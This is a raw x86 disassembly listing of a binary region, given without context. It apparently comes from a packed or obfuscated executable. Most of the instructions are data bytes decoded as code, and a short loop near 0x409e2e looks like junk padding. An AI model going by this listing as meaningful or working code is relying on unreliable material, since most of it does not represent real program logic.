  409a37:	mov    edi,DWORD PTR ds:0x42e19c
  409a3d:	sbb    DWORD PTR ds:0x42e76b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	mul    DWORD PTR [edx]
  409a5a:	fwait
  409a5b:	js     0x409a02
  409a5d:	xchg   esp,ebp
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a51
  409a66:	sbb    BYTE PTR [esi],0xcb
  409a69:	ds retf 0x8fe3
  409a6d:	adc    BYTE PTR [ebx-0x13],bl
  409a70:	sbb    eax,0x9529d0ec
  409a75:	mov    ds:0xc09c7166,al
  409a7a:	pop    edx
  409a7b:	xchg   DWORD PTR [edi-0x273f5808],esi
  409a81:	loop   0x409a37
  409a83:	and    DWORD PTR [esi],esi
  409a85:	dec    esi
  409a86:	mov    edi,0x22c94239
  409a8b:	jmp    0x1786:0x2f0fde93
  409a92:	pusha  
  409a93:	or     al,BYTE PTR [ebx]
  409a95:	cwde   
  409a96:	jl     0x409a58
  409a98:	pop    ss
  409a99:	xor    al,0x2d
  409a9b:	xchg   esi,eax
  409a9c:	mov    ch,0x1e
  409a9e:	ret    0x9430
  409aa1:	es iret 
  409aa3:	mov    ebp,0xb0bd4c89
  409aa8:	or     DWORD PTR [ebp+ecx*4+0x7138dd3a],ebp
  409aaf:	and    DWORD PTR [ecx],esi
  409ab1:	ja     0x409b30
  409ab3:	push   eax
  409ab4:	xor    cl,0x4d
  409ab7:	mov    eax,fs
  409ab9:	sbb    al,0xeb
  409abb:	sbb    eax,0xf518311f
  409ac0:	stos   BYTE PTR es:[edi],al
  409ac1:	fwait
  409ac2:	shr    DWORD PTR [edi+0x64f4e92d],1
  409ac8:	fwait
  409ac9:	shl    edi,1
  409acb:	iret   
  409acc:	sti    
  409acd:	xor    dl,bh
  409acf:	push   cs
  409ad0:	push   ebp
  409ad1:	cmp    esi,DWORD PTR [edi-0x59]
  409ad4:	pop    ebp
  409ad5:	or     eax,0x2f746f29
  409ada:	(bad)  
  409adb:	inc    ecx
  409adc:	xchg   ebx,eax
  409add:	les    esp,FWORD PTR [ebx-0x27bf9825]
  409ae3:	xor    al,0x8b
  409ae5:	jo     0x409b04
  409ae7:	mov    DWORD PTR [eax],esi
  409ae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aea:	mov    esp,0xb61cb999
  409aef:	sub    eax,0x599512fd
  409af4:	xor    al,0x8c
  409af6:	sub    ah,dh
  409af8:	je     0x409b1c
  409afa:	cmp    BYTE PTR [edi+edi*1],ch
  409afd:	dec    eax
  409afe:	mov    WORD PTR [esi+0x24],fs
  409b01:	test   eax,0x39b90aad
  409b06:	bound  ebp,QWORD PTR [eax-0xd]
  409b09:	xchg   DWORD PTR [ecx],ebx
  409b0b:	cbw    
  409b0d:	sub    ebp,DWORD PTR [edi]
  409b0f:	daa    
  409b10:	ret    0xb9a3
  409b13:	fmul   QWORD PTR [ecx-0x6]
  409b16:	mov    dl,0xad
  409b18:	cmp    DWORD PTR [esi+0x72960bf0],ebx
  409b1e:	sub    eax,0x7a0eea0f
  409b23:	mov    esp,0x69566b8a
  409b28:	sar    DWORD PTR [ecx],cl
  409b2a:	pop    es
  409b2b:	sbb    DWORD PTR [ebp-0x26],esi
  409b2e:	std    
  409b2f:	inc    edx
  409b30:	add    BYTE PTR [ecx-0x1ecdb993],dh
  409b36:	push   ebx
  409b37:	xor    esi,edi
  409b39:	cmp    esi,DWORD PTR [ebx+ebx*2-0x699dfc0]
  409b40:	add    BYTE PTR [edx+0x62038fd4],ch
  409b46:	leave  
  409b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b48:	(bad)  
  409b4a:	push   ebx
  409b4b:	inc    esi
  409b4c:	push   esi
  409b4d:	pop    ecx
  409b4e:	mov    ecx,0xb8f407d2
  409b53:	hlt    
  409b54:	ror    BYTE PTR [ebx+0x3f],0xae
  409b58:	ja     0x409afd
  409b5a:	data16 mov bl,0xe0
  409b5d:	push   ebx
  409b5e:	call   0x5078:0x1e70201a
  409b65:	loopne 0x409b40
  409b67:	xchg   BYTE PTR [esi-0x1d],cl
  409b6a:	mov    dh,0x3b
  409b6c:	lock mov BYTE PTR [esi+0x32],dl
  409b70:	push   edx
  409b71:	or     DWORD PTR [ebx+0x732abb2c],0x9d289dfb
  409b7b:	(bad)  
  409b7c:	popf   
  409b7d:	sbb    esp,DWORD PTR [bx+si-0x44]
  409b81:	test   eax,0x14ee165e
  409b86:	push   eax
  409b87:	loope  0x409b4d
  409b89:	jae    0x409bd8
  409b8b:	cmp    eax,0x4d2da8f
  409b90:	sub    BYTE PTR [esi+edx*2+0x3d95a58e],al
  409b97:	pushf  
  409b98:	mov    esi,DWORD PTR [ebx+0x7e]
  409b9b:	stc    
  409b9c:	sbb    ebx,DWORD PTR [ecx+eax*8-0x1bc03f05]
  409ba3:	adc    DWORD PTR [ebp-0x6b],ebx
  409ba6:	cdq    
  409ba7:	mov    DWORD PTR [ecx+0x410dc366],edx
  409bad:	outs   dx,DWORD PTR ds:[esi]
  409bae:	fcomp  st(2)
  409bb0:	fcom   DWORD PTR [ebp-0x227f1739]
  409bb6:	mov    dl,0x8e
  409bb8:	push   ebx
  409bb9:	inc    esi
  409bba:	es out dx,al
  409bbc:	sti    
  409bbd:	mov    cl,0x66
  409bbf:	add    esi,DWORD PTR [ebx]
  409bc1:	test   BYTE PTR [eax-0x75fff41b],ah
  409bc7:	lods   eax,DWORD PTR ds:[esi]
  409bc8:	neg    BYTE PTR [ecx+0x5b8b3fa3]
  409bce:	cld    
  409bcf:	pop    ebx
  409bd0:	call   0x46fbcb9e
  409bd5:	push   ecx
  409bd6:	lds    esi,FWORD PTR [ebx-0x135a4308]
  409bdc:	cmp    DWORD PTR fs:[ecx+ebp*2],ebp
  409be0:	mov    ebp,0xb50b7079
  409be5:	xchg   ebx,eax
  409be6:	in     al,dx
  409be7:	lods   al,BYTE PTR ds:[esi]
  409be8:	or     al,0x34
  409bea:	ds or  dl,dl
  409bed:	sti    
  409bee:	xor    esi,DWORD PTR ds:0x8b6cc184
  409bf4:	and    esi,DWORD PTR [eax-0x69]
  409bf7:	or     esp,esp
  409bf9:	int    0xff
  409bfb:	(bad)  
  409bfc:	xchg   ebx,eax
  409bfd:	jle    0x409be6
  409bff:	comiss xmm0,DWORD PTR [ecx-0x6c]
  409c03:	xchg   ecx,eax
  409c04:	lods   eax,DWORD PTR ds:[esi]
  409c05:	xchg   ebp,eax
  409c06:	out    0xa,al
  409c08:	jge    0x409c78
  409c0a:	and    dh,bh
  409c0c:	mov    dl,BYTE PTR [edi]
  409c0e:	jl     0x409bcf
  409c10:	test   al,0xc1
  409c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c13:	cmp    DWORD PTR [edi-0x78],edx
  409c16:	jge    0x409c1d
  409c18:	xchg   DWORD PTR [esi],edx
  409c1a:	out    dx,al
  409c1b:	sub    esp,DWORD PTR [edx-0x6d93dab3]
  409c21:	mov    esi,0x5cc86fa3
  409c26:	xchg   DWORD PTR [ecx],esp
  409c28:	addr16 cmp ecx,ebx
  409c2b:	div    DWORD PTR [eax-0x6919be18]
  409c31:	nop
  409c32:	imul   eax,DWORD PTR [edx+0x15],0xa43cf0bb
  409c39:	sub    ebx,DWORD PTR [ecx+eax*1+0x1573abab]
  409c40:	aam    0xd1
  409c42:	push   ss
  409c43:	mov    DWORD PTR [esi-0x6e],esi
  409c46:	outs   dx,BYTE PTR ds:[esi]
  409c47:	xchg   DWORD PTR [ebx],esi
  409c49:	enter  0xdc98,0xe9
  409c4d:	mov    ebp,0x3111f585
  409c52:	push   ebp
  409c53:	mov    eax,0x810c8499
  409c58:	add    edi,0xc737a405
  409c5e:	adc    cl,BYTE PTR [edi+0x3933ad3d]
  409c64:	mov    BYTE PTR [esi],cl
  409c66:	retf   
  409c67:	repnz retf 0x8e63
  409c6b:	mov    al,BYTE PTR ds:0x89b5a84a
  409c71:	scas   eax,DWORD PTR es:[edi]
  409c72:	inc    ebx
  409c73:	shl    BYTE PTR [edi-0x37b95120],0x4d
  409c7a:	imul   ecx,DWORD PTR [ecx+0xfcf8ce7],0x18
  409c81:	xlat   BYTE PTR ds:[ebx]
  409c82:	mov    edx,0x35715e87
  409c87:	pop    eax
  409c88:	pusha  
  409c89:	ret    0xb729
  409c8c:	push   edx
  409c8d:	jmp    0x1b733ff1
  409c92:	adc    eax,0x1ade6997
  409c97:	stos   BYTE PTR es:[edi],al
  409c98:	cmp    edx,DWORD PTR [eax+0x8fe3b60]
  409c9e:	xchg   edi,eax
  409c9f:	cmp    dl,BYTE PTR [edi+0x31c8b7b1]
  409ca5:	mov    al,0x1c
  409ca7:	ins    BYTE PTR es:[edi],dx
  409ca8:	fst    QWORD PTR [esi-0x7dc6ac7e]
  409cae:	arpl   WORD PTR [esi-0x61],di
  409cb1:	repz and eax,0x5a57f493
  409cb7:	push   ds
  409cb8:	icebp  
  409cb9:	sbb    BYTE PTR [ebx-0x75],ah
  409cbc:	jmp    0xc646b8d5
  409cc1:	in     eax,0x62
  409cc3:	xchg   ecx,eax
  409cc4:	sbb    DWORD PTR cs:[ecx+ecx*4],eax
  409cc8:	les    ebp,FWORD PTR [eax]
  409cca:	je     0x409ce2
  409ccc:	mov    ds:0xe75d8a0d,al
  409cd1:	cpuid  
  409cd3:	loope  0x409c63
  409cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cd6:	pop    ds
  409cd7:	sbb    ebp,ebp
  409cd9:	lods   al,BYTE PTR fs:[esi]
  409cdb:	leave  
  409cdc:	daa    
  409cdd:	sbb    bl,BYTE PTR [edx]
  409cdf:	daa    
  409ce0:	shr    BYTE PTR [edi+eax*4-0x215380d4],1
  409ce7:	mov    cl,BYTE PTR [edi+eiz*1]
  409cea:	aaa    
  409ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cec:	cmp    ch,ch
  409cee:	ja     0x409d15
  409cf0:	lea    ebp,[ebx]
  409cf2:	lock aad 0x9a
  409cf5:	xor    al,0xe1
  409cf7:	jmp    0xa18394b7
  409cfc:	pop    ecx
  409cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cfe:	je     0x409c84
  409d00:	cmp    al,0x35
  409d02:	bound  esi,QWORD PTR [esi+0x17ab2d32]
  409d08:	fs xchg ebx,eax
  409d0a:	xchg   dh,bh
  409d0c:	push   esp
  409d0d:	add    ecx,ebp
  409d0f:	adc    ch,ah
  409d11:	inc    ebp
  409d12:	jnp    0x409d6f
  409d14:	push   edx
  409d15:	test   ch,0x5b
  409d18:	and    BYTE PTR [ecx+0x31346a17],dh
  409d1e:	jp     0x409ccf
  409d20:	sub    eax,0xf7b400a7
  409d25:	mov    edx,0xd175b479
  409d2a:	mov    dl,0xba
  409d2c:	mov    esi,0xbcc1319a
  409d31:	jnp    0x409d70
  409d33:	jno    0x409db0
  409d35:	cmpxchg DWORD PTR [ecx],ecx
  409d38:	int3   
  409d39:	aam    0xe4
  409d3b:	into   
  409d3c:	fcomp  QWORD PTR [edx-0x6e2b53d2]
  409d42:	or     BYTE PTR [eax-0x4b],dh
  409d45:	dec    esp
  409d46:	adc    ecx,edx
  409d48:	ret    
  409d49:	(bad)  
  409d4b:	call   0xec01f372
  409d50:	jmp    0x409d95
  409d52:	mov    ds:0x18fff019,eax
  409d57:	gs xchg ecx,eax
  409d59:	imul   ebp,ebx,0x4e
  409d5c:	inc    eax
  409d5d:	pushf  
  409d5e:	call   0x8c4b:0x91676c99
  409d65:	sub    DWORD PTR [esi-0x5cacc5d7],esp
  409d6b:	jbe    0x409db7
  409d6d:	cs sahf 
  409d6f:	jl     0x409d2f
  409d71:	mov    cl,0xdd
  409d73:	ss mov ch,0x1b
  409d76:	push   ecx
  409d77:	iret   
  409d78:	jmp    0xfbc15713
  409d7d:	neg    BYTE PTR [eax+0x21]
  409d80:	stc    
  409d81:	xchg   esi,eax
  409d82:	push   ss
  409d83:	xchg   ebp,eax
  409d84:	mov    esp,0xa1321909
  409d89:	or     esp,DWORD PTR [ecx-0x5b]
  409d8c:	mov    ah,0xf8
  409d8e:	lahf   
  409d8f:	mov    ebx,0xad998c45
  409d94:	jecxz  0x409d9b
  409d96:	loopne 0x409dca
  409d98:	mov    edi,0x6d13407f
  409d9d:	mov    edi,0x3cf522c6
  409da2:	lock pop ss
  409da4:	cmp    eax,DWORD PTR [eax-0x66953d4]
  409daa:	dec    eax
  409dab:	push   edi
  409dac:	test   DWORD PTR [edi-0x39c0ba5b],ebx
  409db2:	pop    ebx
  409db3:	cmp    DWORD PTR [ebp-0x5417710],esi
  409db9:	scas   eax,DWORD PTR es:[edi]
  409dba:	js     0x409e11
  409dbc:	adc    eax,0x2aa85b56
  409dc1:	enter  0xcad6,0x50
  409dc5:	sahf   
  409dc6:	mov    ah,0x1
  409dc8:	je     0x409d50
  409dca:	sbb    BYTE PTR ds:[eax-0x50ae2f7a],bl
  409dd1:	or     BYTE PTR [edx+0x7b274921],ch
  409dd7:	jb     0x409e09
  409dd9:	add    ebp,DWORD PTR [edi-0x5e]
  409ddc:	js     0x409dd0
  409dde:	xor    al,0xc6
  409de0:	push   ds
  409de1:	or     DWORD PTR [eax+edx*8-0x4f],edi
  409de5:	fild   WORD PTR [ecx]
  409de7:	dec    esi
  409de8:	jmp    0x7024:0x6455a100
  409def:	sbb    edi,ecx
  409df1:	arpl   WORD PTR [esi-0x11],si
  409df4:	and    al,0xb7
  409df6:	les    ebx,FWORD PTR [ebx]
  409df8:	frstor [bp+0x2521]
  409dfd:	fidivr DWORD PTR [ebx-0x7a]
  409e00:	ins    DWORD PTR es:[di],dx
  409e02:	inc    esi
  409e03:	lds    eax,FWORD PTR [edx+0x31d10310]
  409e09:	or     eax,0x42fe0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fd79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e1a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e363
  409e51:	mov    edi,DWORD PTR ds:0x42fe02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e783,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	cs int 0xf1
  409e84:	stos   BYTE PTR es:[edi],al
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	jl     0x409e49
  409e8f:	mov    esi,0x34559814
  409e94:	xchg   ecx,eax
  409e95:	xchg   DWORD PTR [ebp-0x49],ecx
  409e98:	call   0xe2c30b8b
  409e9d:	or     dl,0xa4
  409ea0:	bound  esi,QWORD PTR [ebx-0x62]
  409ea3:	xchg   ecx,eax
  409ea4:	sub    al,0x94
  409ea6:	out    0x44,al
  409ea8:	in     al,dx
  409ea9:	mov    WORD PTR [ecx-0x23f652c5],ds
  409eaf:	jbe    0x409ef7
  409eb1:	rcr    BYTE PTR [edi+0x6f2a1ff8],0x76
  409eb8:	jns    0x409e89
  409eba:	xchg   edi,eax
  409ebb:	pop    ecx
  409ebc:	mov    bl,bh
  409ebe:	dec    cx
  409ec0:	ins    DWORD PTR es:[edi],dx
  409ec1:	pusha  
  409ec2:	mov    WORD PTR [eax+edi*2],ss
  409ec5:	xchg   DWORD PTR [ecx+0xc],edx
  409ec8:	dec    esp
  409ec9:	in     eax,dx
  409eca:	out    0x65,al
  409ecc:	jl     0x409edd
  409ece:	jg     0x409e73
  409ed0:	sub    BYTE PTR [ecx],dh
  409ed2:	sub    DWORD PTR ds:0x381842b0,0x3fade626
  409edc:	mov    dh,0xde
  409ede:	sub    al,0x30
  409ee0:	mov    al,BYTE PTR [eax]
  409ee2:	push   0x65c4d6e4
  409ee7:	jl     0x409ea9
  409ee9:	mov    edi,0x67a6ce53
  409eee:	push   ebx
  409eef:	enter  0xcda6,0x1c
  409ef3:	inc    ecx
  409ef4:	out    dx,eax
  409ef5:	int3   
  409ef6:	ja     0x409ef1
  409ef8:	pop    esi
  409ef9:	test   eax,0x42bb2eca
  409efe:	repnz pop edi
  409f00:	push   edx
  409f01:	pop    ebp
  409f02:	popf   
  409f03:	mov    dh,ah
  409f05:	iret   
  409f06:	test   al,0x99
  409f08:	imul   esp,DWORD PTR [edi-0x7548eb54],0xffffff8f
  409f0f:	jmp    0x409ec8
  409f11:	in     al,0xe3
  409f13:	loopne 0x409f7d
  409f15:	xchg   ebp,eax
  409f16:	xchg   ebx,eax
  409f17:	(bad)  
  409f19:	popa   
  409f1a:	mov    eax,ds:0x195bc40e
  409f1f:	and    ebx,DWORD PTR [esi+0x61ce7dbb]
  409f25:	adc    cl,BYTE PTR [ecx-0x1685d9b6]
  409f2b:	test   BYTE PTR [ebp+0x48],ch
  409f2e:	enter  0x2a53,0xd4
  409f32:	jnp    0x409f6f
  409f34:	jle    0x409ed4
  409f36:	rol    DWORD PTR [esi-0x33046b05],0x3b
  409f3d:	push   ds
  409f3e:	sbb    dh,al
  409f40:	ror    DWORD PTR [edx+eiz*8+0x2d142f5a],0x44
  409f48:	cld    
  409f49:	sub    BYTE PTR [eax+0x3180ff94],ah
  409f4f:	popf   
  409f50:	out    0xcb,eax
  409f52:	clc    
  409f53:	xor    ebp,DWORD PTR [esi+0x356ddaed]
  409f59:	adc    DWORD PTR [ecx],ebp
  409f5b:	sbb    DWORD PTR [eax+ebx*4],ecx
  409f5e:	xor    dl,BYTE PTR [eax]
  409f60:	lea    edx,[ebx]
  409f62:	sub    esi,esp
  409f64:	pop    es
  409f65:	icebp  
  409f66:	push   cs
  409f67:	mov    WORD PTR [edx],?
  409f69:	jp     0x409eef
  409f6b:	in     al,dx
  409f6c:	mov    DWORD PTR [esi+0x654bca3b],ebx
  409f72:	daa    
  409f73:	test   BYTE PTR [eax-0xb],ch
  409f76:	nop
  409f77:	cmp    BYTE PTR [edi+edi*2-0x49e299cb],bh
  409f7e:	cli    
  409f7f:	aaa    
  409f80:	xor    eax,0x3f4ccd76
  409f85:	stos   BYTE PTR es:[edi],al
  409f86:	mov    esi,0x3f1051ab
  409f8b:	test   dl,ch
  409f8d:	mov    gs,WORD PTR ds:0xeb3e0dfe
  409f93:	in     eax,0xcb
  409f95:	mov    ebp,0x6eec0b78
  409f9a:	leave  
  409f9b:	test   ebx,ebx
  409f9d:	dec    edx
  409f9e:	pop    esi
  409f9f:	pop    eax
  409fa0:	les    esi,FWORD PTR [ebx-0x34]
  409fa3:	push   ebx
  409fa4:	dec    ebx
  409fa5:	dec    esi
  409fa6:	adc    eax,ebp
  409fa8:	outs   dx,DWORD PTR ds:[esi]
  409fa9:	sub    esi,DWORD PTR [eax+0x78]
  409fac:	test   al,0xa3
  409fae:	inc    esp
  409faf:	fsub   DWORD PTR [edi+0x35]
  409fb2:	imul   edx,eax,0x224caec4
  409fb8:	sub    eax,DWORD PTR [edx+ebx*8-0x2a]
  409fbc:	imul   esp,DWORD PTR cs:[eax-0x6f],0x44
  409fc1:	and    BYTE PTR [eax+0x74],al
  409fc4:	mov    eax,ds:0x22309d78
  409fc9:	stos   DWORD PTR es:[edi],eax
  409fca:	xlat   BYTE PTR ds:[ebx]
  409fcb:	lock and al,0x39
  409fce:	jmp    0x162b:0xdb469967
  409fd5:	cs push ds
  409fd7:	dec    ebx
  409fd8:	pop    ss
  409fd9:	pop    ebp
  409fda:	js     0x409faa
  409fdc:	and    ah,bl
  409fde:	je     0x409f7e
  409fe0:	imul   edi,DWORD PTR [edx+edi*2+0x3e],0x7ca29f03
  409fe8:	mov    al,ds:0x37657e
  409fed:	std    
  409fee:	ret    
  409fef:	mov    ah,0xa8
  409ff1:	clc    
  409ff2:	data16 jae 0x409faa
  409ff5:	push   ds
  409ff6:	dec    edi
  409ff7:	sub    DWORD PTR [ebx-0x5],ecx
  409ffa:	sub    esp,DWORD PTR [eax+0x521bfbb1]
  40a000:	push   ds
  40a001:	rol    BYTE PTR [esi-0x1a],0xb9
  40a005:	adc    dh,al
  40a007:	adc    al,0x33
  40a009:	dec    esi
  40a00a:	ins    DWORD PTR es:[edi],dx
  40a00b:	add    al,0xd
  40a00d:	and    eax,esi
  40a00f:	sbb    bh,ah
  40a011:	ret    
  40a012:	xchg   esi,eax
  40a013:	sub    BYTE PTR [ecx],ch
  40a015:	out    dx,eax
  40a016:	loope  0x40a030
  40a018:	mov    bl,0xc
  40a01a:	jne    0x409ffb
  40a01c:	test   esp,eax
  40a01e:	adc    eax,0x27dede28
  40a023:	xchg   ebp,eax
  40a024:	fist   DWORD PTR [ebp-0x6f]
  40a027:	jb     0x409ff8
  40a029:	fnstenv [ebx-0x76b5f6b7]
  40a02f:	div    DWORD PTR [edi+0x5133c9a3]
  40a035:	(bad)  [esi+0x37]
  40a038:	iret   
  40a039:	int    0xe2
  40a03b:	jg     0x40a0bb
  40a03d:	jns    0x409ff1
  40a03f:	xchg   edx,eax
  40a040:	mov    DWORD PTR [edi+0xb],ebx
  40a043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a045:	jmp    0xeff754e1
  40a04a:	dec    eax
  40a04b:	(bad)  
  40a04f:	pop    ecx
  40a050:	jbe    0x409fdd
  40a052:	ins    DWORD PTR es:[edi],dx
  40a053:	sar    DWORD PTR [ecx+0x2c3a51ca],0x27
  40a05a:	popf   
  40a05b:	push   eax
  40a05c:	inc    ebx
  40a05d:	cmp    dl,bl
  40a05f:	jmp    DWORD PTR [ebx+0x2565490]
  40a065:	add    eax,esp
  40a067:	ret    
  40a068:	lods   al,BYTE PTR ds:[esi]
  40a069:	mov    dl,0xab
  40a06b:	dec    ebp
  40a06c:	retf   0x9e4a
  40a06f:	or     dh,BYTE PTR [ecx]
  40a071:	mov    esp,DWORD PTR [ebx]
  40a073:	pop    eax
  40a074:	mul    esi
  40a076:	push   0xc096148b
  40a07b:	ja     0x40a053
  40a07d:	fwait
  40a07e:	sub    eax,0xed0373a9
  40a083:	cmpxchg BYTE PTR [eax+0x1b],ah
  40a087:	push   esp
  40a088:	dec    ebp
  40a089:	adc    al,0x6f
  40a08b:	fistp  DWORD PTR [esi]
  40a08d:	push   cs
  40a08e:	in     al,dx
  40a08f:	scas   al,BYTE PTR es:[edi]
  40a090:	mov    ecx,cs
  40a092:	or     BYTE PTR [ebx-0x216f526c],cl
  40a098:	hlt    
  40a099:	jbe    0x40a068
  40a09b:	inc    ebp
  40a09c:	dec    eax
  40a09d:	sbb    DWORD PTR [ecx+0x4f8e87c6],esi
  40a0a3:	sbb    edi,DWORD PTR [ecx-0x12eeda80]
  40a0a9:	in     eax,0xaf
  40a0ab:	sbb    eax,0x3fdb1fef
  40a0b0:	push   edx
  40a0b1:	and    al,0x4
  40a0b3:	es in  al,0xfa
  40a0b6:	xchg   ebx,eax
  40a0b7:	or     DWORD PTR [ecx+0x349516d6],eax
  40a0bd:	rcl    DWORD PTR [eax],0x5c
  40a0c0:	(bad)  
  40a0c1:	push   ebp
  40a0c2:	bound  ebx,QWORD PTR [edi+ecx*1+0x17083694]
  40a0c9:	mov    edx,0x20df1c62
  40a0ce:	imul   eax,DWORD PTR [ebx+0xc1df0d],0xffffffea
  40a0d5:	mov    eax,DWORD PTR [ecx+0x5941b16c]
  40a0db:	in     eax,dx
  40a0dc:	xchg   DWORD PTR [edi+0x1e],ebp
  40a0df:	xchg   BYTE PTR [eax],bl
  40a0e1:	add    eax,DWORD PTR [edi]
  40a0e3:	inc    esp
  40a0e4:	xchg   edi,eax
  40a0e5:	jecxz  0x40a0df
  40a0e7:	mov    edi,0x5d841cf7
  40a0ec:	(bad)  
  40a0ee:	jno    0x40a087
  40a0f0:	fs dec ebx
  40a0f2:	cmp    eax,0x69eddbe4
  40a0f7:	jmp    0x40a142
  40a0f9:	nop
  40a0fa:	test   BYTE PTR [edx+eax*4],0x1b
  40a0fe:	xor    ebx,DWORD PTR [ebx-0x5e36c6b3]
  40a104:	daa    
  40a105:	mov    esp,edx
  40a107:	in     eax,0xa8
  40a109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a10a:	push   ds
  40a10b:	and    ebx,ebx
  40a10d:	mov    BYTE PTR [eax+0x2c],ah
  40a110:	addr16 loope 0x40a135
  40a113:	mov    DWORD PTR [ecx+0x73d1419d],edx
  40a119:	add    al,0xbb
  40a11b:	gs out dx,al
  40a11d:	sub    eax,0xe2f118ea
  40a122:	sub    edx,DWORD PTR [esi+esi*4]
  40a125:	mov    ds:0x852e6790,al
  40a12a:	and    esp,DWORD PTR [ecx-0x5]
  40a12d:	or     DWORD PTR [ebp+0x59],ebp
  40a130:	add    ebp,esi
  40a132:	jns    0x40a120
  40a134:	mov    ah,0x2a
  40a136:	mov    DWORD PTR ds:0x1182d523,esp
  40a13c:	rol    al,1
  40a13e:	jnp    0x40a141
  40a140:	popf   
  40a141:	pusha  
  40a142:	fwait
  40a143:	push   edx
  40a144:	xchg   edi,eax
  40a145:	xchg   esi,eax
  40a146:	fbstp  TBYTE PTR [ebp-0xc2309da]
  40a14c:	ret    0x4821
  40a14f:	mov    WORD PTR [esi+0x154d4c52],es
  40a155:	inc    eax
  40a156:	or     BYTE PTR [ebx-0x2ddc4a54],ah
  40a15c:	or     bh,bh
  40a15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15f:	xchg   ecx,eax
  40a160:	inc    edx
  40a161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a162:	int3   
  40a163:	cmp    ah,dh
  40a165:	(bad)  
  40a166:	dec    edi
  40a167:	bound  edi,QWORD PTR [edx-0x766a26c2]
  40a16d:	mov    ecx,0x7469e862
  40a172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a173:	jmp    0x40a163
  40a175:	add    dh,BYTE PTR [eax+0x7b]
  40a178:	jmp    0xf2d4daed
  40a17d:	or     eax,0x8f3ce3e8
  40a182:	cs mov dh,0xe6
  40a185:	jb     0x40a16e
  40a187:	push   ebp
  40a188:	in     eax,dx
  40a189:	or     eax,0xd5417e62
  40a18e:	xchg   edx,eax
  40a18f:	mov    eax,ds:0x55a4d4ef
  40a194:	sbb    BYTE PTR [ecx],0x8a
  40a197:	inc    ebx
  40a198:	in     eax,0xd9
  40a19a:	adc    al,0x78
  40a19c:	popf   
  40a19d:	stos   BYTE PTR es:[edi],al
  40a19e:	je     0x40a160
  40a1a0:	popa   
  40a1a1:	mov    al,ds:0xf393ba2d
  40a1a6:	stos   BYTE PTR es:[edi],al
  40a1a7:	call   0x40174189
  40a1ac:	test   BYTE PTR [esi-0x4961ef8c],bl
  40a1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b3:	mov    ah,al
  40a1b5:	dec    eax
  40a1b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b7:	pop    ecx
  40a1b8:	ret    0x93f0
  40a1bb:	jbe    0x40a1c1
  40a1bd:	(bad)  
  40a1be:	out    0x41,al
  40a1c0:	mov    ebx,0x66895fd2
  40a1c5:	dec    ebx
  40a1c6:	pop    eax
  40a1c7:	xchg   edx,eax
  40a1c8:	push   ss
  40a1c9:	into   
  40a1ca:	sub    DWORD PTR [esp+eiz*4-0x6a040681],ebp
  40a1d1:	pop    esi
  40a1d2:	clc    
  40a1d3:	jmp    0x6b093974
  40a1d8:	jg     0x40a15c
  40a1da:	ud2    
  40a1dc:	lahf   
  40a1dd:	dec    eax
  40a1de:	add    eax,0x7dfd3e85
  40a1e3:	sub    eax,0x5f9d9c2b
  40a1e8:	pop    esp
  40a1e9:	pop    edx
  40a1ea:	lods   al,BYTE PTR ds:[esi]
  40a1eb:	faddp  st(6),st
  40a1ed:	rcl    ebx,0x1d
  40a1f0:	mov    al,ds:0xe8626bf9
  40a1f5:	mov    edi,0xed19b0ae
  40a1fa:	inc    edx
  40a1fb:	adc    BYTE PTR [edi+0x3221c2d6],al
  40a201:	push   0xfffffff4
  40a203:	jmp    0xcada:0xa773b7f1
  40a20a:	sub    bl,BYTE PTR [edi]
  40a20c:	mov    dl,0x28
  40a20e:	js     0x40a203
  40a210:	jle    0x40a1ac
  40a212:	loopne 0x40a202
  40a214:	fldenv [edi+esi*4-0x7f]
  40a218:	xor    BYTE PTR [edi],dl
  40a21a:	aad    0x41
  40a21c:	mov    DWORD PTR [ecx+ebp*1-0x1c6311d],edi
  40a223:	icebp  
  40a224:	scas   al,BYTE PTR es:[edi]
  40a225:	lods   eax,DWORD PTR ds:[esi]
  40a226:	inc    edi
  40a227:	mov    eax,ds:0x7a157dc
  40a22c:	fst    QWORD PTR [edi+eax*8-0x7a2e03bb]
  40a233:	pushf  
